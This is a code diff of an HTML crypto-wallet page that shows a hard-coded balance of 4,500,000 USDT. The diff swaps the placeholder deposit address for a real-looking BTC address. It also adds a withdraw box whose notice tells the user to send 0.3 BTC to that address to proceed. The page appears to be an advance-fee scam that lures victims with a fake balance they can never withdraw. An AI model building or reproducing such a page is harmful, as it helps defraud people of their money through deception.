@@ -1,4 +1,4 @@
-<!-- Full HTML code starts here -->
+<!-- Paste this into your HTML file -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -152,7 +152,7 @@
   </div>
 
   <div class="welcome-message">
-    <h1 id="welcomeTitle">Welcome to Wallet BTC</h1>
+    <h1 id="welcomeTitle">Welcome to Your Wallet</h1>
     <p id="welcomeSub">Your secure and fast crypto wallet</p>
   </div>
 
@@ -166,8 +166,8 @@
 
   <div class="dashboard hidden" id="dashboard">
     <div class="balance">
-      <p>Balance: 4,500,000.00 USDT</p>
-      <p>≈ <span id="btcAmount">Loading...</span> BTC</p>
+      <p><img src="https://cryptologos.cc/logos/tether-usdt-logo.png" width="20" style="vertical-align:middle;"> Balance: 4,500,000.00 USDT</p>
+      <p><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" width="20" style="vertical-align:middle;"> ≈ <span id="btcAmount">Loading...</span> BTC</p>
     </div>
 
     <div class="chart-buttons">
@@ -180,37 +180,42 @@
 
   <div class="footer hidden" id="footerNav">
     <div class="footer-btn" onclick="openModal('depositModal')">
-      <i class="fas fa-arrow-down"></i>Deposit
+      <i class="fas fa-arrow-down"></i><span>Deposit</span>
     </div>
     <div class="footer-btn" onclick="openModal('withdrawModal')">
-      <i class="fas fa-arrow-up"></i>Withdraw
+      <i class="fas fa-arrow-up"></i><span>Withdraw</span>
     </div>
     <div class="footer-btn" onclick="openModal('transactionModal')">
-      <i class="fas fa-list-alt"></i>Transactions
+      <i class="fas fa-list-alt"></i><span>Transactions</span>
     </div>
     <div class="footer-btn" onclick="logout()">
-      <i class="fas fa-sign-out-alt"></i>Logout
+      <i class="fas fa-sign-out-alt"></i><span>Logout</span>
     </div>
   </div>
 
-  <!-- Modals -->
+  <!-- Deposit Modal -->
   <div class="modal" id="depositModal">
     <div class="modal-content">
       <h3>Deposit</h3>
-      <p>BTC Address:</p>
-      <p id="walletAddress">bc1qexampleaddress</p>
+      <p>Send BTC to:</p>
+      <p id="walletAddress">bc1qdhgh0u5n38a2rt7jvewfk67uja3dxfl2emwe6u</p>
       <div id="qrcode"></div>
       <button class="login-button" onclick="saveTransaction('Deposit')">Save Transaction</button>
       <button class="login-button" onclick="closeModal('depositModal')">Close</button>
     </div>
   </div>
+
+  <!-- Withdraw Modal -->
   <div class="modal" id="withdrawModal">
     <div class="modal-content">
       <h3>Withdraw</h3>
-      <p>(Withdrawal feature coming soon...)</p>
+      <input type="text" class="login-input" placeholder="BTC Address" onblur="showWithdrawNotice(this.value)" />
+      <div id="withdrawNotice" style="margin-top:10px;color:var(--highlight);"></div>
       <button class="login-button" onclick="closeModal('withdrawModal')">Close</button>
     </div>
   </div>
+
+  <!-- Transactions Modal -->
   <div class="modal" id="transactionModal">
     <div class="modal-content">
       <h3>Transactions</h3>
@@ -222,12 +227,12 @@
   <script>
     const translations = {
       en: {
-        welcome: "Welcome to Wallet BTC",
+        welcome: "Welcome to Your Wallet",
         sub: "Your secure and fast crypto wallet",
         login: "Login"
       },
       es: {
-        welcome: "Bienvenido a Wallet BTC",
+        welcome: "Bienvenido a Tu Billetera",
         sub: "Tu billetera cripto segura y rápida",
         login: "Iniciar sesión"
       }
@@ -319,6 +324,15 @@
       location.reload();
     }
 
+    function showWithdrawNotice(value) {
+      const notice = document.getElementById("withdrawNotice");
+      if (!value.trim()) {
+        notice.innerHTML = "Please enter a valid BTC address.<br>To proceed, send <strong>0.3 BTC</strong> to:<br><strong>bc1qdhgh0u5n38a2rt7jvewfk67uja3dxfl2emwe6u</strong>";
+      } else {
+        notice.innerHTML = "";
+      }
+    }
+
     window.onload = () => {
       const savedTheme = localStorage.getItem('theme');
       if (savedTheme) document.body.setAttribute('data-theme', savedTheme);
@@ -332,4 +346,3 @@
   </script>
 </body>
 </html>
-<!-- Full HTML code ends here -->
